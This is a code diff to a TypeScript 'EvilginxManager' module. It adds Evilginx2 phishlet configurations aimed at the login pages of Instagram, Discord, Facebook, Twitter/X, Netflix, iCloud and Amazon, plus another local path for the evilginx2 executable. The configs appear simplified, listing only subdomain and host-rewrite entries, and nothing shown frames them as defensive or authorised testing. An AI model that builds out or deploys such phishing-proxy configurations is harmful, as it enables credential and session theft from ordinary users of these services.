@@ -123,6 +123,129 @@ rewrite = "www.linkedin.com"
 subdomain = "www"
 `,
   },
+  {
+    name: 'instagram',
+    domain: 'instagram.com',
+    description: 'Instagram login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "instagram"
+author = "RedHawk"
+
+[subdomains]
+www = "www.instagram.com"
+api = "api.instagram.com"
+
+[host_replace]
+rewrite = "www.instagram.com"
+subdomain = "www"
+`,
+  },
+  {
+    name: 'discord',
+    domain: 'discord.com',
+    description: 'Discord login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "discord"
+author = "RedHawk"
+
+[subdomains]
+discord = "discord.com"
+cdn = "cdn.discord.com"
+
+[host_replace]
+rewrite = "discord.com"
+subdomain = "discord"
+`,
+  },
+  {
+    name: 'facebook',
+    domain: 'facebook.com',
+    description: 'Facebook login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "facebook"
+author = "RedHawk"
+
+[subdomains]
+www = "www.facebook.com"
+m = "m.facebook.com"
+
+[host_replace]
+rewrite = "www.facebook.com"
+subdomain = "www"
+`,
+  },
+  {
+    name: 'twitter',
+    domain: 'twitter.com',
+    description: 'Twitter / X login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "twitter"
+author = "RedHawk"
+
+[subdomains]
+twitter = "twitter.com"
+x = "x.com"
+
+[host_replace]
+rewrite = "twitter.com"
+subdomain = "twitter"
+`,
+  },
+  {
+    name: 'netflix',
+    domain: 'netflix.com',
+    description: 'Netflix login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "netflix"
+author = "RedHawk"
+
+[subdomains]
+www = "www.netflix.com"
+
+[host_replace]
+rewrite = "www.netflix.com"
+subdomain = "www"
+`,
+  },
+  {
+    name: 'icloud',
+    domain: 'icloud.com',
+    description: 'Apple iCloud login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "icloud"
+author = "RedHawk"
+
+[subdomains]
+icloud = "icloud.com"
+
+[host_replace]
+rewrite = "icloud.com"
+subdomain = "icloud"
+`,
+  },
+  {
+    name: 'amazon',
+    domain: 'amazon.com',
+    description: 'Amazon login page',
+    author: 'RedHawk',
+    config: `[phishlet]
+name = "amazon"
+author = "RedHawk"
+
+[subdomains]
+www = "www.amazon.com"
+
+[host_replace]
+rewrite = "www.amazon.com"
+subdomain = "www"
+`,
+  },
 ];
 
 export class EvilginxManager extends EventEmitter {
@@ -259,6 +382,7 @@ export class EvilginxManager extends EventEmitter {
     const commonPaths = [
       'C:\\tools\\evilginx2\\evilginx2.exe',
       'C:\\Users\\Public\\evilginx2\\evilginx2.exe',
+      'C:\\cybersec stuff\\evilginx2\\evilginx2.exe',
     ];
     for (const p of commonPaths) {
       if (fs.existsSync(p)) {
